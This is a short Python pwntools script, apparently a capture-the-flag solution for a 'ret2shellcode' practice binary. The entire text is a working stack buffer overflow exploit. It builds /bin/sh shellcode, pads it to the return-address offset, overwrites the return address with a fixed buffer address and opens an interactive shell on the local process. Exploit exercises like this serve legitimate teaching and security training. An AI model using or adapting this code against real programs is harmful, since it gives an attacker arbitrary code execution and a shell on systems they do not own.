from pwn import *
shellcode = asm(shellcraft.sh())
buf2_addr=0x804a080
print('shellcode len:{}'.format(len(shellcode)))
offset=0x6c+4
shellcode_pad=shellcode+(offset-len(shellcode))*b'M'

sh=process("./ret2shellcode")
sh.sendline(shellcode_pad+p32(buf2_addr))
sh.interactive()
